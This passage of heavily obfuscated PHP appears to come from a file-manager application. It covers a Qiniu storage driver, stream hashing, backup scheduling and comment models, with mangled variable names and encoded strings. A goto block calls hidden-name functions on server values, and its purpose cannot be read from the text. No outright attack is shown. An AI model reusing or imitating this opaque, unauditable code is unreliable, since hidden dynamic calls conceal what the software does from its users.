$_SERVER[Ş­ğŠìÒ]; $ØÍ½¹Í = array($®ğ¢Á[32] => $this->pathThis($ÖŒ›Û–), $®ğ¢Á[87] => $this->getPathOuter($®ğ¢Á[8] . $ÖŒ›Û–), $®ğ¢Á[33] => $®ğ¢Á[230], $®ğ¢Á[79] => isset($ËÆ°º¾è[$®ğ¢Á[1524]]) ? $ËÆ°º¾è[$®ğ¢Á[1524]] : 0, $®ğ¢Á[169] => $this->ext($ÖŒ›Û–)); if ($¿‘ÉÂÃ¥) { return $ØÍ½¹Í; } $ØÍ½¹Í[$®ğ¢Á[231]] = $ØÍ½¹Í[$®ğ¢Á[88]] = 0; $ØÍ½¹Í[$®ğ¢Á[232]] = $ØÍ½¹Í[$®ğ¢Á[233]] = !0; if (empty($ËÆ°º¾è)) { $ËÆ°º¾è = $this->objectMeta($ÖŒ›Û–); if (!$ËÆ°º¾è) { return $ØÍ½¹Í; } } if (isset($ËÆ°º¾è[$®ğ¢Á[234]]) && $ËÆ°º¾è[$®ğ¢Á[234]]) { $ØÍ½¹Í[$®ğ¢Á[235]] = $ËÆ°º¾è[$®ğ¢Á[234]]; } if (isset($ËÆ°º¾è[$®ğ¢Á[245]]) && $ËÆ°º¾è[$®ğ¢Á[245]]) { $ØÍ½¹Í[$®ğ¢Á[235]] = $ËÆ°º¾è[$®ğ¢Á[245]]; } if (isset($ËÆ°º¾è[$®ğ¢Á[1525]])) { $ØÍ½¹Í[$®ğ¢Á[88]] = substr($ËÆ°º¾è[$®ğ¢Á[1525]] . $®ğ¢Á[12], 0, 10); } if (isset($ËÆ°º¾è[$®ğ¢Á[1524]])) { $ØÍ½¹Í[$®ğ¢Á[79]] = $ËÆ°º¾è[$®ğ¢Á[1524]]; } return $ØÍ½¹Í; } public function folderInfo($‡’’àæ, $˜Şè¼Û = false) { $ü©éÏ =& $_SERVER[Ş­ğŠìÒ]; $Éáë“ÕÂ = array($ü©éÏ[32] => $this->pathThis($‡’’àæ), $ü©éÏ[87] => $this->getPathOuter($ü©éÏ[8] . $‡’’àæ), $ü©éÏ[33] => $ü©éÏ[78]); if ($˜Şè¼Û) { return $Éáë“ÕÂ; } $Éáë“ÕÂ[$ü©éÏ[231]] = $Éáë“ÕÂ[$ü©éÏ[88]] = 0; $Éáë“ÕÂ[$ü©éÏ[232]] = $Éáë“ÕÂ[$ü©éÏ[233]] = !0; $‡’’àæ = rtrim($‡’’àæ, $ü©éÏ[8]) . $ü©éÏ[8]; $ïÉº•í = $this->objectMeta($‡’’àæ); if (isset($ïÉº•í[$ü©éÏ[1525]])) { $Éáë“ÕÂ[$ü©éÏ[88]] = substr($ïÉº•í[$ü©éÏ[1525]] . $ü©éÏ[12], 0, 10); } return $Éáë“ÕÂ; } public function listPath($¤´ÎÔ‰í, $‘é¡•¬È = false) { $ËŒ©ó™ =& $_SERVER[Ş­ğŠìÒ]; $„ÁªóÓŒ = $this->fileList($¤´ÎÔ‰í, $ËŒ©ó™[8], !0); foreach ($„ÁªóÓŒ[$ËŒ©ó™[85]] as $Ò²ºª„• => $£ê´÷ıç) { $„ÁªóÓŒ[$ËŒ©ó™[85]][$Ò²ºª„•] = $this->folderInfo($£ê´÷ıç, $‘é¡•¬È); } foreach ($„ÁªóÓŒ[$ËŒ©ó™[86]] as $Ò²ºª„• => $£ê´÷ıç) { $„ÁªóÓŒ[$ËŒ©ó™[86]][$Ò²ºª„•] = $this->fileInfo($£ê´÷ıç[$ËŒ©ó™[97]], $‘é¡•¬È, $£ê´÷ıç); } return $„ÁªóÓŒ; } public function has($¶ä†‰£¦, $õà­ô©Ú = false, $ş—£œá = true) { $Ë½÷«—ò =& $_SERVER[Ş­ğŠìÒ]; $¶ä†‰£¦ = trim($¶ä†‰£¦, $Ë½÷«—ò[8]); $â‹àÁ± = empty($¶ä†‰£¦) && $¶ä†‰£¦ !== $Ë½÷«—ò[228] ? $Ë½÷«—ò[12] : $¶ä†‰£¦ . $Ë½÷«—ò[8]; $Í·™¢Š– = $Ë½÷«—ò[12]; $Ïæ™€Í = 500; $½¢¡ÄÍ = $Ë½÷«—ò[8]; $Â´–“›Ì = $†ÕºÁû¡ = 0; while (!0) { check_abort(); list($‚ä¨¹È‹, $ÑÒæ˜ï) = $this->bucketManager->listFiles($this->bucket, $â‹àÁ±, $Í·™¢Š–, $Ïæ™€Í, $½¢¡ÄÍ); if ($ÑÒæ˜ï) { break; } $Í·™¢Š– = array_key_exists($Ë½÷«—ò[1470], $‚ä¨¹È‹) ? $Í·™¢Š– = $‚ä¨¹È‹[$Ë½÷«—ò[1526]] : $Ë½÷«—ò[12]; if ($õà­ô©Ú) { if (!empty($‚ä¨¹È‹[$Ë½÷«—ò[1527]])) { $Â´–“›Ì += count($‚ä¨¹È‹[$Ë½÷«—ò[1527]]); } if (!empty($‚ä¨¹È‹[$Ë½÷«—ò[1528]])) { $†ÕºÁû¡ += count($‚ä¨¹È‹[$Ë½÷«—ò[1528]]); } if ($Í·™¢Š– === $Ë½÷«—ò[12]) { break; } continue; } if ($ş—£œá) { if (!empty($‚ä¨¹È‹[$Ë½÷«—ò[1527]])) { return !0; } } else { if (!empty($‚ä¨¹È‹[$Ë½÷«—ò[1528]])) { return !0; } } if ($Í·™¢Š– === $Ë½÷«—ò[12]) { break; } } if ($õà­ô©Ú) { return array($Ë½÷«—ò[239] => $Â´–“›Ì, $Ë½÷«—ò[240] => $†ÕºÁû¡); } return !1; } public function listAll($¤Èºì¯¨) { $èò€Œ×ô =& $_SERVER[Ş­ğŠìÒ]; $Ô®×·ß = $this->fileList($¤Èºì¯¨, $èò€Œ×ô[12], !0); $Œ–Òİ× = array_to_keyvalue($Ô®×·ß[$èò€Œ×ô[86]], $èò€Œ×ô[32]); foreach ($Ô®×·ß[$èò€Œ×ô[85]] as $ê¾¹á¿ß) { if (is_string($ê¾¹á¿ß)) { $Œ–Òİ×[$ê¾¹á¿ß] = array($èò€Œ×ô[79] => 0); } } return $this->listAllFiles($¤Èºì¯¨, $Œ–Òİ×); } private function fileList($¬¬œ¥˜ , $œ“İ¦© = '', $ü–ú‡ş = 0) { $³†ÒÏà =& $_SERVER[Ş­ğŠìÒ]; $¬¬œ¥˜  = trim($¬¬œ¥˜ , $³†ÒÏà[8]); $©»¼™³‚ = empty($¬¬œ¥˜ ) && $¬¬œ¥˜  !== $³†ÒÏà[228] ? $³†ÒÏà[12] : $¬¬œ¥˜  . $³†ÒÏà[8]; $êÎ¬Üüç = $³†ÒÏà[12]; $³ €üÌ = 1000; $‰‹åî¾‡ = $„ÚÑã£ = array(); while (!0) { check_abort(); list($ÙÄŞ×, $€¶ÃÑÏ) = $this->bucketManager->listFiles($this->bucket, $©»¼™³‚, $êÎ¬Üüç, $³ €üÌ, $œ“İ¦©); if ($€¶ÃÑÏ) { break; } $êÎ¬Üüç = array_key_exists($³†ÒÏà[1470], $ÙÄŞ×) ? $êÎ¬Üüç = $ÙÄŞ×[$³†ÒÏà[1526]] : $³†ÒÏà[12]; $™Ù˜‚”Û = isset($ÙÄŞ×[$³†ÒÏà[1527]]) ? $ÙÄŞ×[$³†ÒÏà[1527]] : array(); $Ü·Àˆôâ = isset($ÙÄŞ×[$³†ÒÏà[1528]]) ? $ÙÄŞ×[$³†ÒÏà[1528]] : array(); foreach ($™Ù˜‚”Û as $Áƒ¦†›) { if ($Áƒ¦†›[$³†ÒÏà[97]] == $©»¼™³‚) { continue; } $÷Â¿ş¥‡ = $Áƒ¦†›[$³†ÒÏà[97]]; $ùëœÑ‹Ã = $Áƒ¦†›[$³†ÒÏà[1524]]; $Áƒ¦†›[$³†ÒÏà[79]] = $ùëœÑ‹Ã; $™éøŒÚİ = $ùëœÑ‹Ã == 0 && substr($÷Â¿ş¥‡, strlen($÷Â¿ş¥‡) - 1, 1) == $³†ÒÏà[8] ? !0 : !1; $this->cacheMethodInfoSet($÷Â¿ş¥‡, $™éøŒÚİ, $Áƒ¦†›); if ($™éøŒÚİ) { $‰‹åî¾‡[] = $÷Â¿ş¥‡; continue; } $„ÚÑã£[] = $ü–ú‡ş ? $Áƒ¦†› : $÷Â¿ş¥‡; } foreach ($Ü·Àˆôâ as $÷Â¿ş¥‡) { if ($÷Â¿ş¥‡ == $©»¼™³‚) { continue; } $‰‹åî¾‡[] = $÷Â¿ş¥‡; $this->cacheMethodInfoSet($÷Â¿ş¥‡, !0); } if ($êÎ¬Üüç === $³†ÒÏà[12]) { break; } } $this->cacheMethodInfoSet($¬¬œ¥˜ , !0); return array($³†ÒÏà[85] => $‰‹åî¾‡, $³†ÒÏà[86] => $„ÚÑã£); } public function canRead($ÅÀ¶Ë­) { return $this->exist($ÅÀ¶Ë­) ? !0 : !1; } public function canWrite($¾´É¢ı) { return $this->exist($¾´É¢ı) ? !0 : !1; } public function getContent($Û“¶•€) { return $this->fileSubstr($Û“¶•€, 0, -1); } public function setContent($¸İúëì, $¾Ãûµóê = '') { $õ¿ÑÀ³Š = $this->tempFile($this->pathThis($¸İúëì)); file_put_contents($õ¿ÑÀ³Š, $¾Ãûµóê); if ($this->upload($¸İúëì, $õ¿ÑÀ³Š)) { $this->tempFileRemve($õ¿ÑÀ³Š); return !0; } return !1; } public function refreshUrls($˜Û­µŠ) { $á±½Å‰ =& $_SERVER[Ş­ğŠìÒ]; $È”Ë¯Œ = array(); if (is_array($˜Û­µŠ)) { foreach ($˜Û­µŠ as $¢ÂÚæÅŞ) { $È”Ë¯Œ[] = $this->link($¢ÂÚæÅŞ); } } else { $È”Ë¯Œ[] = $this->link($˜Û­µŠ); } $ÆùßÛ‘æ = new Qiniu\Cdn\CdnManager($this->auth); list($èÓá‡°Ÿ, $×·Õ—ÜÂ) = $ÆùßÛ‘æ->refreshUrls($È”Ë¯Œ); if ($×·Õ—ÜÂ) { return !1; } return $èÓá‡°Ÿ[$á±½Å‰[1260]] == $á±½Å‰[826] ? !0 : !1; } public function fileSubstr($âê¼÷†Á, $İ“å¹Û, $ŠÚÏÒÂÌ) { $‹´ªÀùß =& $_SERVER[Ş­ğŠìÒ]; if (!($œşùÔ‰“ = $this->link($âê¼÷†Á))) { return !1; } $ç«™¾ª = !1; if ($ŠÚÏÒÂÌ > 0) { $ÜÜªÑô„ = $İ“å¹Û + $ŠÚÏÒÂÌ - 1; $ç«™¾ª = array($‹´ªÀùß[1529] . $İ“å¹Û . $‹´ªÀùß[462] . $ÜÜªÑô„); } $¿Í¡©¶¥ = url_request($œşùÔ‰“, $‹´ªÀùß[261], !1, $ç«™¾ª); return $¿Í¡©¶¥[$‹´ªÀùß[817]] ? $¿Í¡©¶¥[$‹´ªÀùß[1283]] : !1; } public function upload($Ğ”Çüú, $ìó¥Ì‡Ç, $õÇóñÄ = false, $ã©È¢ª¤ = REPEAT_REPLACE) { $ÏÀÈÌ¨Ş = new Qiniu\Storage\UploadManager(); $ÜÃ¦ÉÀó = $this->auth->uploadToken($this->bucket, $Ğ”Çüú); $¸Õ» é = get_file_mime(get_path_ext($ìó¥Ì‡Ç)); list($šáÊÅî , $áô™ âƒ) = $ÏÀÈÌ¨Ş->putFile($ÜÃ¦ÉÀó, $Ğ”Çüú, $ìó¥Ì‡Ç, null, $¸Õ» é); return $áô™ âƒ ? !1 : $this->getPathOuter($Ğ”Çüú); } public function uploadFormData($ÙÁ²üÙ¡, $åß‚¦ÓÃ = 3600) { return $this->uploadToken($ÙÁ²üÙ¡, $åß‚¦ÓÃ); } public function multiUploadFormData($£È³’Û˜, $§èß¤˜‰ = 3600) { return $this->uploadToken($£È³’Û˜, $§èß¤˜‰); } private function uploadToken($¯§¡ó®, $¸œº»°Ş = 3600) { $Á†Ü´Õ =& $_SERVER[Ş­ğŠìÒ]; $öòÑİµÎ = $¸œº»°Ş; $Á·û‚Ÿé = array($Á†Ü´Õ[1530] => $Á†Ü´Õ[1531]); $œé§«ãä = $¯§¡ó®; $º›ª®ÄË = $this->auth->uploadToken($this->bucket, $œé§«ãä, $öòÑİµÎ, $Á·û‚Ÿé, !0); $³ÊÀ›ïÃ = empty($this->region) || $this->region == $Á†Ü´Õ[1532] ? $Á†Ü´Õ[12] : $Á†Ü´Õ[462] . $this->region; $¥×Åö ‚ = http_type() . "\72\57\x2f\x75\x70\x6c\x6f\x61\144{$³ÊÀ›ïÃ}\x2e\161\x69\156\151\x75\x70\x2e\x63\x6f\x6d\57"; return array($Á†Ü´Õ[1533] => $º›ª®ÄË, $Á†Ü´Õ[1534] => $¥×Åö ‚); } public function download($˜éâÃÖÁ, $®ÆÁ™°ğ) { $öŞ¶¯Ëï = IO::getPathInner(IO::mkfile($®ÆÁ™°ğ)); if (!($ÉÙËÖ‰ = $this->link($˜éâÃÖÁ))) { return !1; } $÷ôçòˆı = 0; $ª¸Ä§¡ = 1024 * 200; $š£¿Ÿşæ = fopen($öŞ¶¯Ëï, $_SERVER[Ş­ğŠìÒ][1535]); while (!0) { $øã»îÂ = $this->fileSubstr($˜éâÃÖÁ, $÷ôçòˆı, $ª¸Ä§¡); if ($øã»îÂ === !1) { return !1; } fwrite($š£¿Ÿşæ, $øã»îÂ); $÷ôçòˆı += $ª¸Ä§¡; if (strlen($øã»îÂ) < $ª¸Ä§¡) { break; } } fclose($š£¿Ÿşæ); return $®ÆÁ™°ğ; } public function link($ºÜ’Ü‚‰, $İüÓ¸ = '') { if (!$this->isFile($ºÜ’Ü‚‰)) { return !1; } $ÎëÊƒÅİ = $this->getHost() . $_SERVER[Ş­ğŠìÒ][8] . $this->pathEncode($ºÜ’Ü‚‰) . $İüÓ¸; return $this->auth->privateDownloadUrl($ÎëÊƒÅİ, 3600 * 12); } public function fileOut($ÍÄçê’ç, $û„µ¥±¨ = false, $Ø­ˆÄ¾¯ = false, $Ü•·Š²Ô = '') { $¤¦Ÿ”› =& $_SERVER[Ş­ğŠìÒ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÍÄçê’ç, $û„µ¥±¨, $Ø­ˆÄ¾¯, $Ü•·Š²Ô); } if (!$Ø­ˆÄ¾¯) { $Ø­ˆÄ¾¯ = $this->pathThis($ÍÄçê’ç); } $‚ŒÒ¹ = $û„µ¥±¨ ? $¤¦Ÿ”›[1536] . rawurlencode($Ø­ˆÄ¾¯) : $¤¦Ÿ”›[12]; $í™¼éèó = $this->link($ÍÄçê’ç, $‚ŒÒ¹); $this->fileOutLink($í™¼éèó); } public function fileOutServer($Èø¦îşš, $½œÁÂ®Ô = false, $·±ì†”æ = false, $‹¬ëÓ© = '') { parent::fileOut($Èø¦îşš, $½œÁÂ®Ô, $·±ì†”æ, $‹¬ëÓ©); } public function fileOutImage($ÀÇ †åÖ, $ûÎóˆ›‘ = 250) { if ($this->size($ÀÇ †åÖ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÀÇ †åÖ, $ûÎóˆ›‘); } $Œ§ƒÙ‡ = $this->link($ÀÇ †åÖ, $_SERVER[Ş­ğŠìÒ][1537] . $ûÎóˆ›‘); $this->fileOutLink($Œ§ƒÙ‡); } public function fileOutImageServer($ÊÇÀ¼¯Ÿ, $âª×ÔÊÎ = 250) { parent::fileOutImage($ÊÇÀ¼¯Ÿ, $âª×ÔÊÎ); } public function hashMd5($»Ó°Ñ‘Ü) { $³À½»Ö÷ =& $_SERVER[Ş­ğŠìÒ]; $ú¼Ÿ‹»î = $this->objectMeta($»Ó°Ñ‘Ü); return isset($ú¼Ÿ‹»î[$³À½»Ö÷[245]]) ? $ú¼Ÿ‹»î[$³À½»Ö÷[245]] : !1; $ìË·èñè = $this->link($»Ó°Ñ‘Ü, $³À½»Ö÷[1538]); } public function size($èãÖ¾²ç) { $¤Û‰ÁÌ = $this->objectMeta($èãÖ¾²ç); return $¤Û‰ÁÌ ? $¤Û‰ÁÌ[$_SERVER[Ş­ğŠìÒ][79]] : 0; } public function info($›Ş»Ü¬) { if ($this->isFolder($›Ş»Ü¬)) { return $this->folderInfo($›Ş»Ü¬); } else { if ($this->isFile($›Ş»Ü¬)) { return $this->fileInfo($›Ş»Ü¬); } } return !1; } public function exist($Á¦©ï¶ö) { return $this->isFile($Á¦©ï¶ö) || $this->isFolder($Á¦©ï¶ö); } public function isFile($ô‰ˆÎìŒ) { return !$this->isFolder($ô‰ˆÎìŒ) && $this->objectMeta($ô‰ˆÎìŒ); } public function isFolder($ØøëøÄ») { return $this->cacheMethod($_SERVER[Ş­ğŠìÒ][179], $ØøëøÄ»); } protected function objectMeta($Ë­÷åÛ¦) { return $this->cacheMethod($_SERVER[Ş­ğŠìÒ][181], $Ë­÷åÛ¦); } protected function _objectMeta($Ò¨æö­Ğ) { $©µŸØ‚§ =& $_SERVER[Ş­ğŠìÒ]; list($ö¥½Ğ»Ë, $¸á§ÎüØ) = $this->bucketManager->stat($this->bucket, $Ò¨æö­Ğ); if ($ö¥½Ğ»Ë) { $ö¥½Ğ»Ë[$©µŸØ‚§[79]] = intval($ö¥½Ğ»Ë[$©µŸØ‚§[1524]]); } return $ö¥½Ğ»Ë; } protected function _isFolder($¡ò®íú¨) { $¿š´¦½ =& $_SERVER[Ş­ğŠìÒ]; if ($¡ò®íú¨ == $¿š´¦½[12] || $¡ò®íú¨ == $¿š´¦½[8]) { return !0; } list($¦ÏğüúÛ, $ä°ğé³º) = $this->bucketManager->listFiles($this->bucket, trim($¡ò®íú¨, $¿š´¦½[8]) . $¿š´¦½[8], $¿š´¦½[12], 1, $¿š´¦½[8]); return !empty($¦ÏğüúÛ[$¿š´¦½[1527]]) || !empty($¦ÏğüúÛ[$¿š´¦½[1528]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($–ÓÓ¾Î¹, $œ×œ™Ğæ = 0) { parent::__construct(); $this->source = $–ÓÓ¾Î¹; $this->sourceSize = $œ×œ™Ğæ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ ì´Á¸ = false) { return $this->sourceSize; } public function getContent($¨ ‰­Æ† = false) { return $this->fileSubstr($¨ ‰­Æ†, 0, $this->sourceSize); } public function fileSubstr($ø¨ÎßŠİ = false, $‰š¥‘®› = 0, $¤‚£€½ = 0) { if (!$¤‚£€½) { $¤‚£€½ = $this->sourceSize; } $Î˜õ¢ğé = $this->sourceSize - $‰š¥‘®›; if ($¤‚£€½ >= $Î˜õ¢ğé) { $¤‚£€½ = $Î˜õ¢ğé; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $‰š¥‘®›, $¤‚£€½); } if ($this->sourceType == self::TYPE_FILE) { if ($¤‚£€½ <= 0) { return $_SERVER[Ş­ğŠìÒ][12]; } $Ï§õ• = ftell($this->source); fseek_64($this->source, $Ï§õ• + $‰š¥‘®›); $óÈ˜±ë“ = @fread($this->source, $¤‚£€½); fseek_64($this->source, $Ï§õ•); return $óÈ˜±ë“; } } public function hashMd5($•ß“™Ğ£ = false) { return md5($this->getContent()); } public static function hash($–î÷Æ‘Á, $ÕÀÄµòÂ = 0) { $ÌÓÉ¤ìÒ = new PathDriverStream($–î÷Æ‘Á, $ÕÀÄµòÂ); return $ÌÓÉ¤ìÒ->hashSimple($–î÷Æ‘Á); } public static function md5($·¹—Òû, $ †à¹· = 0) { $ŠÈ‰îÆ = new PathDriverStream($·¹—Òû, $ †à¹·); return $ŠÈ‰îÆ->hashMd5($·¹—Òû); } } goto aÅ¤š»óÒã; Bß­ÕÂÉäİ: if ($_SERVER[$_SERVER[Ş­ğŠìÒ][945]] != $_SERVER[$_SERVER[Ş­ğŠìÒ][1988]]) { $_getc = $_SERVER[Ş­ğŠìÒ][947]; $_getfile = $_SERVER[$_SERVER[Ş­ğŠìÒ][948]] . $_SERVER[Ş­ğŠìÒ][949]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ş­ğŠìÒ][262], $_getfilec); if (count($_getarrs) < $_SERVER[Ş­ğŠìÒ][683]) { $exit = $_SERVER[Ş­ğŠìÒ][950]; $exit(); } $_act = $_SERVER[Ş­ğŠìÒ][958]; $_act($_SERVER[$_SERVER[Ş­ğŠìÒ][943]]); } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\142\141\143\x6b\165\160\114\151\x73\x74"; public $field = array("\151\157", "\156\141\155\x65", "\x73\x74\x61\x74\x75\163", "\x63\157\x6e\164\x65\x6e\x74", "\155\x61\x6e\x75\x61\x6c", "\x72\145\163\x75\154\x74", "\164\151\155\145\x46\162\157\x6d", "\x74\x69\x6d\x65\x54\x6f"); public function config() { $‚¨¾òœ› =& $_SERVER[Ş­ğŠìÒ]; Action($‚¨¾òœ›[1989])->taskInit(); $¥¬˜õÛ = Model($‚¨¾òœ›[837])->get($‚¨¾òœ›[850]); $¥¬˜õÛ = json_decode($¥¬˜õÛ, !0); $¥¬˜õÛ = is_array($¥¬˜õÛ) ? $¥¬˜õÛ : array(); $this->parseContent($¥¬˜õÛ); unset($¥¬˜õÛ[$‚¨¾òœ›[1734]]); Model($‚¨¾òœ›[1733])->cacheClear(); $Š­Şµèƒ = $‚¨¾òœ›[1990]; $Å¶¿¥ˆ = Model($‚¨¾òœ›[1991])->findByKey($‚¨¾òœ›[1752], $Š­Şµèƒ); if (!$Å¶¿¥ˆ) { $Å¶¿¥ˆ = array(); } if (isset($Å¶¿¥ˆ[$‚¨¾òœ›[206]])) { $Å¶¿¥ˆ[$‚¨¾òœ›[206]] = json_decode($Å¶¿¥ˆ[$‚¨¾òœ›[206]], !0); } if (isset($¥¬˜õÛ[$‚¨¾òœ›[206]])) { $Å¶¿¥ˆ[$‚¨¾òœ›[206]][$‚¨¾òœ›[1737]] = $¥¬˜õÛ[$‚¨¾òœ›[206]]; unset($¥¬˜õÛ[$‚¨¾òœ›[206]]); } return array_merge($Å¶¿¥ˆ, $¥¬˜õÛ); } public function listData($Ğë¬Ë¤§ = false, $â¶§¼Ø = "\155\157\144\151\146\x79\124\151\155\145", $ÏÈŒÔ = false) { $¸ı†¹ = parent::listData($Ğë¬Ë¤§, $â¶§¼Ø, !0); if (!$¸ı†¹) { return $¸ı†¹; } if ($Ğë¬Ë¤§) { $¸ı†¹ = array($¸ı†¹); } foreach ($¸ı†¹ as &$à€¿ù¤) { $this->parseContent($à€¿ù¤); } return $Ğë¬Ë¤§ ? $¸ı†¹[0] : $¸ı†¹; } public function parseContent(&$½ºä»ó) { $Øù¿Ší” =& $_SERVER[Ş­ğŠìÒ]; $œÏÃ­©” = _get($½ºä»ó, $Øù¿Ší”[171], $Øù¿Ší”[91]); if (!in_array($œÏÃ­©”, array($Øù¿Ší”[843], $Øù¿Ší”[1207]))) { $½ºä»ó[$Øù¿Ší”[171]] = $œÏÃ­©” == $Øù¿Ší”[91] ? $Øù¿Ší”[1207] : $Øù¿Ší”[843]; } } public function lastItem() { $½¾Ñ‡« = $this->listData(); return !empty($½¾Ñ‡«[0]) ? $½¾Ñ‡«[0] : null; } public function kill($û­ñ¥êï) { $°ÃÏƒáœ =& $_SERVER[Ş­ğŠìÒ]; $»¹¬øáˆ = $this->listData($û­ñ¥êï); if (!$»¹¬øáˆ || empty($»¹¬øáˆ[$°ÃÏƒáœ[32]])) { return !0; } Task::kill($°ÃÏƒáœ[849]); Task::kill($°ÃÏƒáœ[867]); Task::kill($°ÃÏƒáœ[876]); $Õø¾Æê¾ = $»¹¬øáˆ[$°ÃÏƒáœ[32]]; $®½—ÓÖı = TEMP_FILES . $°ÃÏƒáœ[846] . $Õø¾Æê¾ . $°ÃÏƒáœ[8]; IO::remove($®½—ÓÖı, !1); return $this->remove($û­ñ¥êï); } public function remove($üš’Á€š) { $ÎõÃ„Óå = $this->listData($üš’Á€š); if (!$ÎõÃ„Óå) { return !0; } return $this->backupRemove($ÎõÃ„Óå); } private function backupRemove($îš¡ß¾Æ) { parent::remove($îš¡ß¾Æ[$_SERVER[Ş­ğŠìÒ][475]]); $Ş¶øØòª = $this->backupPath($îš¡ß¾Æ); IO::remove($Ş¶øØòª, !1); return !0; } private function backupPath($×ˆƒÇêÉ) { $§‰’÷²õ =& $_SERVER[Ş­ğŠìÒ]; $µæÒÊ‚ = $×ˆƒÇêÉ[$§‰’÷²õ[32]]; $ıË¾©¢ = Model($§‰’÷²õ[837])->get($§‰’÷²õ[838]); $Îöººüö = substr(md5($§‰’÷²õ[839] . $ıË¾©¢ . $µæÒÊ‚), 0, 8); return "\173\151\x6f\x3a{$×ˆƒÇêÉ[$§‰’÷²õ[819]]}\x7d\57\x64\141\x74\x61\142\141\x73\145\x2f\142\x61\x63\x6b\165\160\57" . $µæÒÊ‚ . $§‰’÷²õ[11] . $Îöººüö; } public function start() { $İ·‰±‹æ =& $_SERVER[Ş­ğŠìÒ]; if ($GLOBALS[$İ·‰±‹æ[6]][$İ·‰±‹æ[92]][$İ·‰±‹æ[1992]] != $İ·‰±‹æ[91]) { return !0; } $í™‰©°Æ = $this->config(); if (!$í™‰©°Æ || $í™‰©°Æ[$İ·‰±‹æ[1734]] != $İ·‰±‹æ[91]) { return !1; } if ($í™‰©°Æ[$İ·‰±‹æ[171]] == $İ·‰±‹æ[843]) { $ˆŒàÇáŸ = Model($İ·‰±‹æ[837])->get($İ·‰±‹æ[1320]); if ($ˆŒàÇáŸ == $İ·‰±‹æ[1321]) { $í™‰©°Æ[$İ·‰±‹æ[171]] = $İ·‰±‹æ[1207]; } } $õ×İˆõ™ = $this->process(); foreach ($õ×İˆõ™ as $÷ûŞ¾…Û) { if ($÷ûŞ¾…Û) { return Task::restart($÷ûŞ¾…Û[$İ·‰±‹æ[475]]); } } $ËÂÓ£õ = new Backup(); $¡®×ú” = $ËÂÓ£õ->db(); if ($¡®×ú”) { $¡®×ú” = $ËÂÓ£õ->dbFile(); if ($¡®×ú” && $í™‰©°Æ[$İ·‰±‹æ[171]] == $İ·‰±‹æ[843]) { $¡®×ú” = $ËÂÓ£õ->file(); } } Backup::set(array($İ·‰±‹æ[817] => 1, $İ·‰±‹æ[828] => time())); return !0; } public function process() { $ôïÔÑ =& $_SERVER[Ş­ğŠìÒ]; $Û®ëŞ² = array($ôïÔÑ[824] => Task::get($ôïÔÑ[849]), $ôïÔÑ[829] => Task::get($ôïÔÑ[867]), $ôïÔÑ[230] => Task::get($ôïÔÑ[876])); $±™æøğ‹ = !1; foreach ($Û®ëŞ² as &$¦’‰Ìí) { if ($±™æøğ‹) { $¦’‰Ìí = !1; continue; } if ($¦’‰Ìí) { $ßÓÑÑÒÈ = intval(_get($¦’‰Ìí, $ôïÔÑ[1769], 0)); if (time() - $ßÓÑÑÒÈ > 7200) { Task::kill($¦’‰Ìí[$ôïÔÑ[475]]); $±™æøğ‹ = !0; $¦’‰Ìí = !1; } } } return $Û®ëŞ²; } public function restore() { $¸î²±€° =& $_SERVER[Ş­ğŠìÒ]; ActionCall($¸î²±€°[1134], !0, 1); ActionCall($¸î²±€°[1134], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\145\x6e\164"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\x61\155\x65" => "\143\157\x6d\155\145\156\164\x5f\155\145\x74\x61", "\x6d\x65\164\141\106\x69\x65\154\x64" => "\x63\x6f\x6d\155\x65\x6e\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Èç²Ä´Î) { $óÇµ•òú =& $_SERVER[Ş­ğŠìÒ]; if ($Èç²Ä´Î[$óÇµ•òú[1993]]) { $±Ú×ÃË“ = $this->where(array($óÇµ•òú[1994] => $Èç²Ä´Î[$óÇµ•òú[1993]]))->find(); if (!$±Ú×ÃË“ || $±Ú×ÃË“[$óÇµ•òú[190]] != $Èç²Ä´Î[$óÇµ•òú[190]] || $±Ú×ÃË“[$óÇµ•òú[569]] != $Èç²Ä´Î[$óÇµ•òú[569]]) { return !1; } $this->where(array($óÇµ•òú[1994] => $Èç²Ä´Î[$óÇµ•òú[1993]]))->setAdd($óÇµ•òú[1995], 1); } $Èç²Ä´Î[$óÇµ•òú[1996]] = 0; $Èç²Ä´Î[$óÇµ•òú[1995]] = 0; $Èç²Ä´Î[$óÇµ•òú[817]] = 1; return $this->add($Èç²Ä´Î); } public function commentCount($ì€¼áè, $ÌŒÖÕÍ¤, $¸êñú¼ç = false) { $ğÔã‹ı™ =& $_SERVER[Ş­ğŠìÒ]; if (!$ì€¼áè) { return array(); } if (is_string($ì€¼áè) || is_int($ì€¼áè)) { $ì€¼áè = array($ì€¼áè); } $üŠŸÄø = array($ğÔã‹ı™[569], $ğÔã‹ı™[1997] => $ğÔã‹ı™[565]); $§Æè¢êË = array($ğÔã‹ı™[569] => array($ğÔã‹ı™[7], $ì€¼áè), $ğÔã‹ı™[190] => $ÌŒÖÕÍ¤); if ($¸êñú¼ç) { $§Æè¢êË[$ğÔã‹ı™[1764]] = $¸êñú¼ç; } $¯Êœôó“ = $this->field($üŠŸÄø)->where($§Æè¢êË)->group($ğÔã‹ı™[569])->select(); return array_to_keyvalue($¯Êœôó“, $ğÔã‹ı™[569], $ğÔã‹ı™[565]); } public function starTarget($›£¹ÃÀ‚, $Ï“ŠÈ‚Â) { $öÙ´¼–Ì =& $_SERVER[Ş­ğŠìÒ]; $şîöÎÏà = $›£¹ÃÀ‚ + self::TYPE_STAR_OFFSET; $©ÏîÒˆ = array($öÙ´¼–Ì[1764] => USER_ID, $öÙ´¼–Ì[190] => $şîöÎÏà, $öÙ´¼–Ì[569] => 